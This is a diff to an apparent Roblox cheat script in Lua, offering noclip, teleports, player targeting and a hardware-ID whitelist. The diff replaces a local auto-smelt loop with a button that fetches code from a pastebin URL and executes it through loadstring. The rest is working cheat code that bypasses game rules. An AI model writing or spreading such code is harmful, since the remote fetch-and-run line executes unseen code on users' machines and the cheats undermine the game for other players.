@@ -1,4 +1,4 @@
-Tayer = game.Players.LocalPlayer
+local player = game.Players.LocalPlayer
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
 local whitelist = {
@@ -217,74 +217,14 @@ Tabs.Main:AddToggle("AutoPickup", {Title = "Auto Pickup & Return", Default = fal
     end) end
 end)
 
-local autoSmelt = false
-local smeltThread = nil
-local smeltNoclipConn = nil
-local smeltTargetCF = CFrame.new(2211.09253, 215.999985, -632.645752, 0.0397137627, -5.25412389e-08, 0.999211073, 3.48971376e-08, 1, 5.11957303e-08, -0.999211073, 3.28364322e-08, 0.0397137627)
-
-local function enableSmeltNoclip()
-    if smeltNoclipConn then return end
-    smeltNoclipConn = RunService.Stepped:Connect(function()
-        local char = player.Character
-        if char then
-            for _, part in pairs(char:GetDescendants()) do
-                if part:IsA("BasePart") and part.CanCollide then
-                    part.CanCollide = false
-                end
-            end
-        end
-    end)
-end
-
-local function disableSmeltNoclip()
-    if smeltNoclipConn then
-        smeltNoclipConn:Disconnect()
-        smeltNoclipConn = nil
-    end
-end
-
-local function startSmeltLoop()
-    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-        player.Character.HumanoidRootPart.CFrame = smeltTargetCF
-        task.wait(0.5) 
-    end
-
-    while autoSmelt do
+Tabs.Main:AddButton({
+    Title = "Auto Smelt",
+    Callback = function()
         pcall(function()
-            local char = player.Character
-            if char and char:FindFirstChild("Powers") and char.Powers:FindFirstChild("Smelt") then
-                local remote = char.Powers.Smelt:FindFirstChild("RemoteEvent")
-                
-                local targetStone = workspace:FindFirstChild("IslandMountain") 
-                                    and workspace.IslandMountain:FindFirstChild("Stone") 
-                                    and workspace.IslandMountain.Stone:FindFirstChild("Stone")
-
-                if remote and targetStone then
-                    local args = {
-                        [1] = "SmeltPower3",
-                        [2] = "Attempt",
-                        [3] = CFrame.new(2207, 217.17845153808594, -632.6077880859375) * CFrame.Angles(-2.142265796661377, 1.2162753343582153, 2.1718497276306152),
-                        [4] = targetStone
-                    }
-                    remote:FireServer(unpack(args))
-                end
-            end
+            loadstring(game:HttpGet("https://pastebin.com/raw/6yBSTgmm"))()
         end)
-        task.wait(3) 
     end
-end
-
-Tabs.Main:AddToggle("AutoSmelt", {Title = "Auto Smelt", Default = false}):OnChanged(function(v)
-    autoSmelt = v
-    if autoSmelt then
-        enableSmeltNoclip()
-        if smeltThread then task.cancel(smeltThread) end
-        smeltThread = task.spawn(startSmeltLoop)
-    else
-        disableSmeltNoclip()
-        if smeltThread then task.cancel(smeltThread) end
-    end
-end)
+})
 
 Tabs.Main:AddButton({
     Title = "Auto Fishing Menu",
@@ -316,8 +256,9 @@ for name, cf in pairs(tpLocations) do
     Tabs.Teleport:AddButton({
         Title = "Teleport to " .. name,
         Callback = function()
-            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                player.Character.HumanoidRootPart.CFrame = cf
+            local lp = game:GetService("Players").LocalPlayer
+            if lp and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
+                lp.Character.HumanoidRootPart.CFrame = cf
             end
         end
     })
@@ -326,16 +267,28 @@ end
 local selectedPlr = nil
 local function getPlrs()
     local t = {}
-    for _,p in pairs(game.Players:GetPlayers()) do if p ~= player then table.insert(t, p.Name) end end
+    local lp = game:GetService("Players").LocalPlayer
+    for _,p in pairs(game:GetService("Players"):GetPlayers()) do 
+        if p ~= lp then table.insert(t, p.Name) end 
+    end
     if #t == 0 then table.insert(t, "No other players") end
     return t
 end
+
 local PDrop = Tabs.Player:AddDropdown("PlayerSelector", {Title = "Select Target Player", Values = getPlrs(), Callback = function(v) selectedPlr = v end})
+
 Tabs.Player:AddButton({Title = "Refresh Player List", Callback = function() PDrop:SetValues(getPlrs()) end})
-Tabs.Player:AddButton({Title = "Teleport to Player", Callback = function()
-    local target = game.Players:FindFirstChild(selectedPlr)
-    if target and target.Character then player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame end
-end})
+
+Tabs.Player:AddButton({
+    Title = "Teleport to Player", 
+    Callback = function()
+        local lp = game:GetService("Players").LocalPlayer
+        local target = game:GetService("Players"):FindFirstChild(selectedPlr)
+        if lp and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then 
+            lp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame 
+        end
+    end
+})
 
 Tabs.Misc:AddParagraph({ Title = "Character Mods", Content = "ปรับแต่งตัวละครและการเคลื่อนไหว" })
 local noclip = false
